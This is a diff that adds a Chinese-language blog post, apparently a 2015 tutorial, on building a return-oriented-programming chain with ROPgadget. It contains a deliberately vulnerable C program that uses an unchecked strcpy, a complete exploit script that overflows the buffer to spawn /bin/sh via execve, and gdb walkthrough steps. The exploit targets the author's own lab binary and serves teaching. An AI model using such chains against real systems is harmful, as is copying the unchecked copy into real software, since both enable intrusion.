@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>使用ROPgadget构建gadgets链，实现ROP攻击 | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="缓冲区溢出,ROP," />
+  
+
+  <meta name="description" content="上篇博客简单介绍了ROPgadget，现在我们就来小试牛刀">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用ROPgadget构建gadgets链，实现ROP攻击">
+<meta property="og:url" content="http://huirong.github.io/2015/06/12/use-ROPgadget-to-chain-gadgets/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="上篇博客简单介绍了ROPgadget，现在我们就来小试牛刀">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1et1d063ftej30px0fq0yj.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1et1d0cngncj30n80fp43t.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCjw1et1d0lh38xj30nr05rads.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCjw1et1d0ryguaj30fe016t8q.jpg">
+<meta property="og:updated_time" content="2016-04-16T11:34:15.365Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使用ROPgadget构建gadgets链，实现ROP攻击">
+<meta name="twitter:description" content="上篇博客简单介绍了ROPgadget，现在我们就来小试牛刀">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1et1d063ftej30px0fq0yj.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#I、C程序"><span class="toc-text">I、C程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#II、使用ROPgadget构建gadget链"><span class="toc-text">II、使用ROPgadget构建gadget链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#III、使用gdb分析内存"><span class="toc-text">III、使用gdb分析内存</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-添加断点，设置参数"><span class="toc-text">① 添加断点，设置参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-查看寄存器"><span class="toc-text">② 查看寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-查看内存情况"><span class="toc-text">③ 查看内存情况</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IV、运行结果"><span class="toc-text">IV、运行结果</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V、参考文献"><span class="toc-text">V、参考文献</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-use-ROPgadget-to-chain-gadgets" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">使用ROPgadget构建gadgets链，实现ROP攻击</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2015.06.12</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/ROP/">ROP</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2015/06/12/use-ROPgadget-to-chain-gadgets/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>上篇博客简单介绍了ROPgadget，现在我们就来小试牛刀<br><a id="more"></a></p>
+<h1 id="I、C程序"><a href="#I、C程序" class="headerlink" title="I、C程序"></a>I、C程序</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">char</span> *a)</span></span>&#123;</div><div class="line">        <span class="keyword">char</span> buff[<span class="number">40</span>];</div><div class="line">        <span class="built_in">strcpy</span>(buff,a);</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(argc&gt;=<span class="number">2</span>)</div><div class="line">        function(argv[<span class="number">1</span>]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>编译C程序<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc hello.c -o hello -<span class="keyword">static</span> -g -fno-<span class="built_in">stack</span>-protector</div></pre></td></tr></table></figure></p>
+<h1 id="II、使用ROPgadget构建gadget链"><a href="#II、使用ROPgadget构建gadget链" class="headerlink" title="II、使用ROPgadget构建gadget链"></a>II、使用ROPgadget构建gadget链</h1><p>ROPgadget的安装<a href="http://huirong.github.io/2015/06/12/ROPgadget/">上篇博客</a>已经介绍了,这里不赘述。<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">ropgadget</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">binary</span> <span class="comment">hello</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ropchain</span></div></pre></td></tr></table></figure></p>
+<p>创建输入文件exploit.py<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># execve generated by ROPgadget</span></div><div class="line"></div><div class="line">from struct import <span class="keyword">pack</span></div><div class="line"></div><div class="line"><span class="comment"># Padding goes here</span></div><div class="line">p = <span class="string">''</span></div><div class="line">p += <span class="string">'a'</span>*<span class="number">52</span></div><div class="line"></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080570ca</span>) <span class="comment"># pop edx ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080ee060</span>) <span class="comment"># @ .data</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x0808d211</span>) <span class="comment"># pop eax ; ret</span></div><div class="line">p += <span class="string">'/bin'</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x0808e28d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080570ca</span>) <span class="comment"># pop edx ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080ee064</span>) <span class="comment"># @ .data + 4</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x0808d211</span>) <span class="comment"># pop eax ; ret</span></div><div class="line">p += <span class="string">'//sh'</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x0808e28d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080570ca</span>) <span class="comment"># pop edx ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080ee068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080514e0</span>) <span class="comment"># xor eax, eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x0808e28d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080481ec</span>) <span class="comment"># pop ebx ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080ee060</span>) <span class="comment"># @ .data</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080997d3</span>) <span class="comment"># pop ecx ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080ee068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080570ca</span>) <span class="comment"># pop edx ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080ee068</span>) <span class="comment"># @ .data + 8</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080514e0</span>) <span class="comment"># xor eax, eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x08099b66</span>) <span class="comment"># inc eax ; ret</span></div><div class="line">p += <span class="keyword">pack</span>(<span class="string">'&lt;I'</span>, <span class="number">0x080493b9</span>) <span class="comment"># int 0x80</span></div><div class="line"><span class="keyword">print</span> p</div></pre></td></tr></table></figure></p>
+<p><font color="red">注意：要在gadget之前添加 p += ‘a’*52</font><br>原因：使函数的返回地址指向第一个gadget</p>
+<h1 id="III、使用gdb分析内存"><a href="#III、使用gdb分析内存" class="headerlink" title="III、使用gdb分析内存"></a>III、使用gdb分析内存</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">gdbtui hello</span></div></pre></td></tr></table></figure>
+<h2 id="①-添加断点，设置参数"><a href="#①-添加断点，设置参数" class="headerlink" title="① 添加断点，设置参数"></a>① 添加断点，设置参数</h2><p>根据自己喜欢在程序某个地方设置断点，我一般设置在主函数处<br>运行时参数为 ./exploit.py 的运行结果<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCjw1et1d063ftej30px0fq0yj.jpg" alt=""></p>
+<h2 id="②-查看寄存器"><a href="#②-查看寄存器" class="headerlink" title="② 查看寄存器"></a>② 查看寄存器</h2><p>当运行完strcpy()函数后，查看寄存器情况，主要留意esp  ebp的值<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCjw1et1d0cngncj30n80fp43t.jpg" alt=""></p>
+<h2 id="③-查看内存情况"><a href="#③-查看内存情况" class="headerlink" title="③ 查看内存情况"></a>③ 查看内存情况</h2><p>ebp为0xbffff288，则返回地址在0xbffff28c处，可以发现此时返回地址是第一个gadget的起始地址处</p>
+<p><font color="red">p += ‘a’*52 是为了覆盖缓冲区，直到返回地址处</font><br><img src="http://ww1.sinaimg.cn/large/005CA6ZCjw1et1d0lh38xj30nr05rads.jpg" alt=""></p>
+<h1 id="IV、运行结果"><a href="#IV、运行结果" class="headerlink" title="IV、运行结果"></a>IV、运行结果</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./hello <span class="string">"<span class="variable">$(./exploit.py)</span>"</span></div></pre></td></tr></table></figure>
+<p><img src="http://ww2.sinaimg.cn/large/005CA6ZCjw1et1d0ryguaj30fe016t8q.jpg" alt=""></p>
+<h1 id="V、参考文献"><a href="#V、参考文献" class="headerlink" title="V、参考文献"></a>V、参考文献</h1><p><a href="https://hwchen18546.wordpress.com/2014/07/15/rop-use-ropgadget-to-chain-gadgets/" target="_blank" rel="external">use ROPgadget to chain gadgets</a></p>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2015/06/12/use-ROPgadget-to-chain-gadgets/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2015/06/12/use-ROPgadget-to-chain-gadgets/index.html" data-title="使用ROPgadget构建gadgets链，实现ROP攻击" data-url="http://huirong.github.io/2015/06/12/use-ROPgadget-to-chain-gadgets/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
